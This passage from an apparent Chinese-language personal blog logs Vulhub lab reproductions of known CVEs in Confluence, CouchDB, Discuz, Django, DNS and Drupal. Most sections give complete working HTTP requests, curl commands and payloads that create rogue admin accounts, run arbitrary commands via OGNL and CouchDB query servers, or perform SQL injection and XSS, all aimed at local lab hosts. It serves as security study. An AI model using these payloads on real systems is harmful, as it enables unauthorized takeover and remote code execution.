href="https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis">https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis</a></li></ul></blockquote><h2 id="漏洞复现-23"><a href="#漏洞复现-23" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，最主要的请求就是覆盖目标Confluence服务器中的<code>bootstrapStatusProvider.applicationConfig.setupComplete</code>属性：</p><pre class="line-numbers language-none"><code class="language-none">GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1Host: localhost:8090Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36Connection: closeCache-Control: max-age=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后，你就可以使用如下请求创建一个新的管理员账户<code>vulhub</code>：</p><pre class="line-numbers language-none"><code class="language-none">POST /setup/setupadministrator.action HTTP/1.1Host: localhost:8090Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 110X-Atlassian-Token: no-checkusername=vulhub&amp;fullName=vulhub&amp;email=admin%40vulhub.org&amp;password=vulhub&amp;confirm=vulhub&amp;setup-next-button=Next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送如下请求完成安装步骤：</p><pre class="line-numbers language-none"><code class="language-none">POST /setup/finishsetup.action HTTP/1.1Host: localhost:8090Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 0X-Atlassian-Token: no-check<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后，直接使用新的<code>vulhub</code>账户（密码同样是<code>vulhub</code>）来登录Confluence，可见新的管理员已成功增加：</p></blockquote><p>老卡在第一步…没成功</p><h1 id="Confluence-OGNL表达式注入命令执行漏洞（CVE-2023-22527）"><a href="#Confluence-OGNL表达式注入命令执行漏洞（CVE-2023-22527）" class="headerlink" title="Confluence OGNL表达式注入命令执行漏洞（CVE-2023-22527）"></a>Confluence OGNL表达式注入命令执行漏洞（CVE-2023-22527）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统。</p><p>在Confluence 8.0到8.5.3版本之间，存在一处由于任意velocity模板被调用导致的OGNL表达式注入漏洞，未授权攻击者利用该漏洞可以直接攻击Confluence服务器并执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html">https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html</a></li><li><a href="https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/">https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/</a></li></ul></blockquote><h2 id="漏洞复现-24"><a href="#漏洞复现-24" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><h2 id="漏洞复现-25"><a href="#漏洞复现-25" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞利用方法十分简单，直接发送如下请求即可执行任意命令，并在HTTP返回头中获取执行结果：</p><pre class="line-numbers language-none"><code class="language-none">POST /template/aui/text-inline.vm HTTP/1.1Host: localhost:8090Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 285label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&amp;x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/61.jpg" alt="61"></p><h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><blockquote><h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）-1"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）-1" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><p>参考链接：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4716.html">http://bobao.360.cn/learning/detail/4716.html</a></li><li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li></ul></blockquote><h2 id="漏洞复现-26"><a href="#漏洞复现-26" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，发送如下数据包：</p></blockquote><pre class="line-numbers language-none"><code class="language-none">PUT /_users/org.couchdb.user:vulhub HTTP/1.1Host: your-ip:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 90{  "type": "user",  "name": "vulhub",  "roles": ["_admin"],  "password": "vulhub"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，返回403错误：<code>{"error":"forbidden","reason":"Only _admin may set roles"}</code>，只有管理员才能设置Role角色：</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/62.jpg" alt="62"></p><blockquote><p>发送包含两个roles的数据包，即可绕过限制：</p><pre class="line-numbers language-none"><code class="language-none">PUT /_users/org.couchdb.user:vulhub HTTP/1.1Host: your-ip:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 108{  "type": "user",  "name": "vulhub",  "roles": ["_admin"],  "roles": [],  "password": "vulhub"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功创建管理员，账户密码均为<code>vulhub</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/63.jpg" alt="63"></p><blockquote><p>再次访问<code>http://your-ip:5984/_utils/</code>，输入账户密码<code>vulhub</code>，可以成功登录：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/64.jpg" alt="64"></p><h1 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><blockquote><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><p>参考链接：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4716.html">http://bobao.360.cn/learning/detail/4716.html</a></li><li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li></ul></blockquote><h2 id="漏洞复现-27"><a href="#漏洞复现-27" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。</p><blockquote><p> 1.6.0 下的说明</p><p>依次执行如下请求即可触发任意命令执行：</p><pre class="line-numbers language-none"><code class="language-none">curl -X PUT 'http://vulhub:vulhub@127.0.0.1:5984/_config/query_servers/cmd' -d '"id &gt;/tmp/success"'curl -X PUT 'http://vulhub:vulhub@127.0.0.1:5984/vultest'curl -X PUT 'http://vulhub:vulhub@127.0.0.1:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'curl -X POST 'http://vulhub:vulhub@127.0.0.1:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p><p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>"id &gt;/tmp/success"</code>，这就是我们后面待执行的命令。</p><p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p><p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/65.jpg" alt="65"></p><h1 id="CouchDB-Erlang-分布式协议代码执行-CVE-2022-24706"><a href="#CouchDB-Erlang-分布式协议代码执行-CVE-2022-24706" class="headerlink" title="CouchDB Erlang 分布式协议代码执行 (CVE-2022-24706)"></a>CouchDB Erlang 分布式协议代码执行 (CVE-2022-24706)</h1><blockquote><p>Apache CouchDB是一个Erlang开发的NoSQL数据库。</p><p>由于Erlang的特性，其支持分布式计算，分布式节点之间通过Erlang/OTP Distribution协议进行通信。攻击者如果知道通信时使用的Cookie，即可在握手包通过认证并执行任意命令。</p><p>在CouchDB 3.2.1及以前版本中，使用了默认Cookie，值为“monster”。</p><p>参考链接：</p><ul><li><a href="https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html">https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html</a></li><li><a href="https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/">https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/</a></li><li><a href="https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb">https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb</a></li><li><a href="https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit">https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit</a></li></ul></blockquote><h2 id="漏洞复现-28"><a href="#漏洞复现-28" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们可以使用<a href="">这个POC</a>来利用本漏洞。这个POC会先通过目标的4369端口epmd服务获取集群通信的端口，也就是9100，然后再使用默认Cookie来控制节点执行任意命令。</p><pre class="line-numbers language-none"><code class="language-none">&gt;python poc.py target-ip 4369<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/66.jpg" alt="66"></p><h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><blockquote><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p><p>具体原理请参考：</p><ul><li><a href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></li></ul></blockquote><h2 id="漏洞复现-29"><a href="#漏洞复现-29" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code>：</p><pre class="line-numbers language-none"><code class="language-none">GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，phpinfo已成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/67.jpg" alt="67"></p><h1 id="Django-debug-page-XSS漏洞（CVE-2017-12794）分析"><a href="#Django-debug-page-XSS漏洞（CVE-2017-12794）分析" class="headerlink" title="Django debug page XSS漏洞（CVE-2017-12794）分析"></a>Django debug page XSS漏洞（CVE-2017-12794）分析</h1><blockquote><p>Django发布了新版本1.11.5，修复了500页面中可能存在的一个XSS漏洞，这篇文章说明一下该漏洞的原理和复现，和我的一点点评。</p></blockquote><h2 id="漏洞复现-30"><a href="#漏洞复现-30" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>经过我的测试，我发现在使用Postgres数据库并触发异常的时候，psycopg2会将字段名和字段值全部抛出。那么，如果字段值中包含我们可控的字符串，又由于0x02中说到的，这个字符串其实就会被设置成<code>__cause__</code>，最后被显示在页面中。</p><p>所以我们假设有如下场景：</p><ol><li>用户注册页面，未检查用户名</li><li>注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li><li>再次注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li><li>触发duplicate key异常，导致XSS漏洞</li></ol><p>我将上述流程整理成vulhub的一个环境：<a href="https://github.com/phith0n/vulhub/tree/master/django/CVE-2017-12794">https://github.com/phith0n/vulhub/tree/master/django/CVE-2017-12794</a></p><p>编译及启动环境：</p><pre class="line-numbers language-none"><code class="language-none">&gt;docker compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>创建一个用户，成功；再次访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>，触发异常：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/70.jpg" alt="70"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/71.jpg" alt="71"></p><blockquote><p>可见，Postgres抛出的异常为</p><pre class="line-numbers language-none"><code class="language-none">duplicate key value violates unique constraint "xss_user_username_key"DETAIL:  Key (username)=(&lt;script&gt;alert(1)&lt;/script&gt;) already exists.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个异常被拼接进<code>The above exception ({{ frame.exc_cause }}) was the direct cause of the following exception</code>，最后触发XSS。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/72.jpg" alt="72"></p><h1 id="Django-2-0-8-任意URL跳转漏洞（CVE-2018-14574）"><a href="#Django-2-0-8-任意URL跳转漏洞（CVE-2018-14574）" class="headerlink" title="Django < 2.0.8 任意URL跳转漏洞（CVE-2018-14574）"></a>Django &lt; 2.0.8 任意URL跳转漏洞（CVE-2018-14574）</h1><blockquote><p>Django默认配置下，如果匹配上的URL路由中最后一位是/，而用户访问的时候没加/，Django默认会跳转到带/的请求中。（由配置项中的<code>django.middleware.common.CommonMiddleware</code>、<code>APPEND_SLASH</code>来决定）。</p><p>在path开头为<code>//example.com</code>的情况下，Django没做处理，导致浏览器认为目的地址是绝对路径，最终造成任意URL跳转漏洞。</p><p>该漏洞利用条件是目标<code>URLCONF</code>中存在能匹配上<code>//example.com</code>的规则。</p></blockquote><h2 id="漏洞复现-31"><a href="#漏洞复现-31" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>访问<code>http://your-ip:8000//www.example.com</code>，即可返回是301跳转到<code>//www.example.com/</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/73.jpg" alt="73"></p><h1 id="Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"><a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="headerlink" title="Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）"></a>Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）</h1><blockquote><p>Django在2019年8月1日发布了一个安全更新，修复了在JSONField、HStoreField两个模型字段中存在的SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.djangoproject.com/weblog/2019/aug/01/security-releases/">https://www.djangoproject.com/weblog/2019/aug/01/security-releases/</a></li><li><a href="https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html">https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html</a></li></ul><p>该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。Django自带的后台应用Django-Admin中就存在这样的写法，我们可以直接借助它来复现漏洞。</p></blockquote><h2 id="漏洞复现-32"><a href="#漏洞复现-32" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先登陆后台<code>http://your-ip:8000/admin/</code>，用户名密码为<code>admin</code>、<code>a123123123</code>。</p><p>登陆后台后，进入模型<code>Collection</code>的管理页面<code>http://your-ip:8000/admin/vuln/collection/</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/74.jpg" alt="74"></p><blockquote><p>然后在GET参数中构造<code>detail__a'b=123</code>提交，其中<code>detail</code>是模型<code>Collection</code>中的JSONField：</p><p><a href="http://your-ip:8000/admin/vuln/collection/?detail__a%27b=123">http://your-ip:8000/admin/vuln/collection/?detail__a%27b=123</a></p><p>可见，单引号已注入成功，SQL语句报错：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/75.jpg" alt="75"></p><h1 id="Django-GIS-SQL注入漏洞（CVE-2020-9402）"><a href="#Django-GIS-SQL注入漏洞（CVE-2020-9402）" class="headerlink" title="Django GIS SQL注入漏洞（CVE-2020-9402）"></a>Django GIS SQL注入漏洞（CVE-2020-9402）</h1><blockquote><p> Django在2020年3月4日发布了一个安全更新，修复了在GIS 查询功能中存在的SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.djangoproject.com/weblog/2020/mar/04/security-releases/">https://www.djangoproject.com/weblog/2020/mar/04/security-releases/</a></li></ul><p>该漏洞需要开发者使用了GIS中聚合查询的功能，用户在oracle的数据库且可控tolerance查询时的键名，在其位置注入SQL语句。</p></blockquote><h2 id="漏洞复现-33"><a href="#漏洞复现-33" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞一"><a href="#漏洞一" class="headerlink" title="漏洞一"></a>漏洞一</h3><blockquote><p>首先访问<code>http://your-ip:8000/vuln/</code>。</p><p>在该网页中使用<code>get</code>方法构造<code>q</code>的参数，构造SQL注入的字符串<code>20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1</code></p><p><a href="http://your-ip:8000/vuln/?q=20)%20=%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v$instance))%20from%20dual)%20is%20null%20%20OR%20">http://your-ip:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20</a>(1%2B1</p><p>可见，括号已注入成功，SQL语句查询报错：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/76.jpg" alt="76"></p><h3 id="漏洞二"><a href="#漏洞二" class="headerlink" title="漏洞二"></a>漏洞二</h3><blockquote><p>访问<code>http://your-ip:8000/vuln2/</code>。<br>在该网页中使用<code>get</code>方法构造<code>q</code>的参数，构造出SQL注入的字符串<code>0.05))) FROM "VULN_COLLECTION2"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --</code></p><p><a href="http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--">http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--</a></p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/77.jpg" alt="77"></p><h1 id="Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）"><a href="#Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）" class="headerlink" title="Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）"></a>Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）</h1><blockquote><p>Django在2021年7月1日发布了一个安全更新，修复了在QuerySet底下的order_by函数中存在的SQL注入漏洞</p><p>参考链接:</p><ul><li><a href="https://www.djangoproject.com/weblog/2021/jul/01/security-releases/">https://www.djangoproject.com/weblog/2021/jul/01/security-releases/</a></li></ul><p>该漏洞需要用户可控order_by传入的值，在预期列的位置注入SQL语句。</p></blockquote><h2 id="漏洞复现-34"><a href="#漏洞复现-34" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 访问页面<code>http://your-ip:8000/vuln/</code>，在GET参数中构造<code>order=-id</code>，会得到根据id降序排列的结果：<br><code>http://your-ip:8000/vuln/?order=-id</code></p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/78.jpg" alt="78"></p><blockquote><p>再构造GET参数<code>order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code>提交，其中<code>vuln_collection</code>是<code>vuln</code>应用下的模型<code>Collection</code></p><p><code>http://your-ip:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code></p><p>成功注入SQL语句，利用堆叠注入获得信息：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/79.jpg" alt="79"></p><h1 id="Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）"><a href="#Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）" class="headerlink" title="Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）"></a>Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）</h1><blockquote><p>Django在2022年7月4日发布了安全更新，修复了在数据库函数<code>Trunc()</code>和<code>Extract()</code>中存在的SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.djangoproject.com/weblog/2022/jul/04/security-releases/">https://www.djangoproject.com/weblog/2022/jul/04/security-releases/</a></li><li><a href="https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492">https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492</a></li></ul></blockquote><h2 id="漏洞复现-35"><a href="#漏洞复现-35" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>修改<code>date</code>参数即可复现SQL注入漏洞：</p><pre class="line-numbers language-none"><code class="language-none">http://your-ip:8000/?date=xxxx'xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/80.jpg" alt="80"></p><h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/">https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/</a></li><li><a href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html">https://nmap.org/nsedoc/scripts/dns-zone-transfer.html</a></li></ul><h2 id="漏洞复现-36"><a href="#漏洞复现-36" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用<code>dig @your-ip www.vulhub.org</code>获取域名<code>www.vulhub.org</code>在目标dns服务器上的A记录：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/81.jpg" alt="81"></p><blockquote><p>发送axfr类型的dns请求：<code>dig @your-ip -t axfr vulhub.org</code></p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/82.jpg" alt="82"></p><blockquote><p>可见，我获取到了<code>vulhub.org</code>的所有子域名记录，这里存在DNS域传送漏洞。</p><p>我们也可以用nmap script来扫描该漏洞：<code>nmap --script dns-zone-transfer.nse --script-args "dns-zone-transfer.domain=vulhub.org" -Pn -p 53 192.168.0.196</code></p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/83.jpg" alt="83"></p><h1 id="Drupal-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1><blockquote><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。</p></blockquote><h2 id="漏洞复现-37"><a href="#漏洞复现-37" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>该漏洞无需认证，发送如下数据包即可执行恶意SQL语句：</p><pre class="line-numbers language-none"><code class="language-none">POST /?q=node&amp;destination=node HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 120pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，信息已被爆出：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/84.jpg" alt="84"></p><h1 id="Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）"><a href="#Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）" class="headerlink" title="Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）"></a>Drupal Core 8 PECL YAML 